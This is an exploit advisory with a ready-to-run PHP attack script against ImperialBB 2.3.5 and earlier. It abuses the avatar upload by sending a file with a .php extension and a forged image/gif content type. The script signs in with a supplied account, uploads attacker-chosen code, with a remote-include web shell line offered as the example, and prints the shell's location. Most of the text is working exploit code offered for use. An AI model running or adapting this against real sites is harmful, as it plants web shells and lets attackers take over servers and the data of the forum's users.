Title     :    ImperialBB &lt;= 2.3.5 Remote File Upload Vulnerability
Date      :    5th July 2008
Found by  :    PHPLizardo - http://phplizardo.2gb.fr
Greetz    :    Gu1ll4um3r0m41n

Howto     :    1. Go to your User Control Panel
               2. Upload any file you want
               3. Tamper the request and change the mime-type to : image/gif
               4. There is your file : http://site.com/[forum_path]/images/avatars/uploads/[your_nickname]_[filename].[ext]
			   
&lt;?php
/*

	Title                 :   ImperialBB &lt;= 2.3.5 Remote Upload Vulnerability
	Date                  :   5th July 2008
	Found by              :   PHPLizardo
	
	Description           :   This vulnerability can be used by a attacker to upload  a malicious script on the webserver.

	Greetz                :   irc.worldnet.net #carib0u
							  

*/

if(count($argv) == 5)
{
	echo &quot;\n\n&quot;;
	echo &quot;+---------------------------------------------------------------+\r\n&quot;;
	echo &quot;|        ImperialBB &lt;= 2.3.5 Remote Upload Vulnerability        |\r\n&quot;;
	echo &quot;|           By PHPLizardo - irc.worldnet.net #carib0u           |\r\n&quot;;
	echo &quot;|        Usage: php exploit.php site.com /path/ user pass       |\r\n&quot;;
	echo &quot;+---------------------------------------------------------------+\r\n&quot;;
	echo &quot;\n&quot;;
		
	echo &quot;Code to write in the file (ie. &lt;?php include(\$_GET[&#039;inc&#039;]); ?&gt;) :\r\n\n&quot;;
	$code     =   trim(fgets(STDIN));
	
	$socket   =   @fsockopen($argv[1], 80, $eno, $estr, 30);
	if(!$socket)
	{
		die(&quot;Could not connect to &quot;.$argv[1].&quot;. Operation aborted.&quot;);
	}
	
	$part1      =   &quot;POST &quot; . $argv[2] . &quot;profile.php?func=edit HTTP/1.1\r\n&quot;;
	$part1     .=   &quot;Host: &quot; . $argv[1] . &quot;\r\n&quot;;
	$part1     .=   &quot;Accept: */*\r\n&quot;;
	$part1     .=   &quot;Connection: Close\r\n&quot;;
	$part1     .=   &quot;Cookie: UserName=&quot; . $argv[3] . &quot;; Password=&quot; . md5(md5($argv[4])) . &quot;\r\n&quot;;
	$part1     .=   &quot;Content-Type: multipart/form-data; boundary=---------------------------200831142015814\r\n&quot;;
	
	$part2     .=   &quot;-----------------------------200831142015814\r\n&quot;;
	$part2     .=   &quot;Content-Disposition: form-data; name=\&quot;Email\&quot;\r\n\r\n&quot;;
	$part2     .=   &quot;test@test.test\r\n&quot;;
	$part2     .=   &quot;-----------------------------200831142015814\r\n&quot;;
	$part2     .=   &quot;Content-Disposition: form-data; name=\&quot;Email2\&quot;\r\n\r\n&quot;;
	$part2     .=   &quot;test@test.test\r\n&quot;;
	$part2     .=   &quot;-----------------------------200831142015814\r\n&quot;;
	$part2     .=   &quot;Content-Disposition: form-data; name=\&quot;OldPass\&quot;\r\n\r\n\r\n&quot;;
	$part2     .=   &quot;-----------------------------200831142015814\r\n&quot;;
	$part2     .=   &quot;Content-Disposition: form-data; name=\&quot;PassWord\&quot;\r\n\r\n\r\n&quot;;
	$part2     .=   &quot;-----------------------------200831142015814\r\n&quot;;
	$part2     .=   &quot;Content-Disposition: form-data; name=\&quot;Pass2\&quot;\r\n\r\n\r\n&quot;;
	$part2     .=   &quot;-----------------------------200831142015814\r\n&quot;;
	$part2     .=   &quot;Content-Disposition: form-data; name=\&quot;signature\&quot;\r\n\r\n\r\n&quot;;
	$part2     .=   &quot;-----------------------------200831142015814\r\n&quot;;
	$part2     .=   &quot;Content-Disposition: form-data; name=\&quot;aim\&quot;\r\n\r\n\r\n&quot;;
	$part2     .=   &quot;-----------------------------200831142015814\r\n&quot;;
	$part2     .=   &quot;Content-Disposition: form-data; name=\&quot;icq\&quot;\r\n\r\n\r\n&quot;;
	$part2     .=   &quot;-----------------------------200831142015814\r\n&quot;;
	$part2     .=   &quot;Content-Disposition: form-data; name=\&quot;msn\&quot;\r\n\r\n\r\n&quot;;
	$part2     .=   &quot;-----------------------------200831142015814\r\n&quot;;
	$part2     .=   &quot;Content-Disposition: form-data; name=\&quot;yahoo\&quot;\r\n\r\n\r\n&quot;;
	$part2     .=   &quot;-----------------------------200831142015814\r\n&quot;;
	$part2     .=   &quot;Content-Disposition: form-data; name=\&quot;Remote_Avatar_URL\&quot;\r\n\r\n\r\n&quot;;
	$part2     .=   &quot;-----------------------------200831142015814\r\n&quot;;
	$part2     .=   &quot;Content-Disposition: form-data; name=\&quot;Upload_Avatar\&quot;; filename=\&quot;funypicture.php\&quot;\r\n&quot;;
	$part2     .=   &quot;Content-Type: image/gif\r\n\r\n&quot;;
	$part2     .=   $code.&quot;\r\n&quot;;
	$part2     .=   &quot;-----------------------------200831142015814\r\n&quot;;
	$part2     .=   &quot;Content-Disposition: form-data; name=\&quot;month\&quot;\r\n\r\n&quot;;
	$part2     .=   &quot;00\r\n&quot;;
	$part2     .=   &quot;-----------------------------200831142015814\r\n&quot;;
	$part2     .=   &quot;Content-Disposition: form-data; name=\&quot;day\&quot;\r\n\r\n&quot;;
	$part2     .=   &quot;00\r\n&quot;;
	$part2     .=   &quot;-----------------------------200831142015814\r\n&quot;;
	$part2     .=   &quot;Content-Disposition: form-data; name=\&quot;year\&quot;\r\n\r\n&quot;;
	$part2     .=   &quot;0000\r\n&quot;;
	$part2     .=   &quot;-----------------------------200831142015814\r\n&quot;;
	$part2     .=   &quot;Content-Disposition: form-data; name=\&quot;website\&quot;\r\n\r\n\r\n&quot;;

	$part2     .=   &quot;-----------------------------200831142015814\r\n&quot;;
	$part2     .=   &quot;Content-Disposition: form-data; name=\&quot;location\&quot;\r\n\r\n\r\n&quot;;
	$part2     .=   &quot;-----------------------------200831142015814\r\n&quot;;
	$part2     .=   &quot;Content-Disposition: form-data; name=\&quot;email_on_pm\&quot;\r\n\r\n&quot;;
	$part2     .=   &quot;0\r\n&quot;;
	$part2     .=   &quot;-----------------------------200831142015814\r\n&quot;;
	$part2     .=   &quot;Content-Disposition: form-data; name=\&quot;OldPass\&quot;\r\n\r\n\r\n&quot;;
	$part2     .=   &quot;-----------------------------200831142015814\r\n&quot;;
	$part2     .=   &quot;Content-Disposition: form-data; name=\&quot;Submit\&quot;\r\n\r\n&quot;;
	$part2     .=   &quot;Submit\r\n&quot;;
	$part2     .=   &quot;-----------------------------200831142015814--\r\n&quot;;
	
	$part1     .=   &quot;Content-Length: &quot; . strlen($part2) . &quot;\r\n\r\n&quot;;
	
	
	
	$part1     .=   $part2;
	
	fwrite($socket, $part1);
	
	echo &quot;It might have worked, check if your file is online at -&gt; http://&quot; . $argv[1] . $argv[2] . &quot;/images/avatars/uploads/&quot; . $argv[3] . &quot;_funypicture.php&quot;;
	
}
else
{
	echo &quot;\n\n&quot;;
	echo &quot;+----.-----------------------------------------------------------+\r\n&quot;;
	echo &quot;|        ImperialBB &lt;= 2.3.5 Remote Upload Vulnerability        |\r\n&quot;;
	echo &quot;|           By PHPLizardo - irc.worldnet.net #carib0u           |\r\n&quot;;
	echo &quot;|        Usage: php exploit.php site.com /path/ user pass       |\r\n&quot;;
	echo &quot;+---------------------------------------------------------------+\r\n&quot;;
	echo &quot;\n\n&quot;;
}
?&gt;

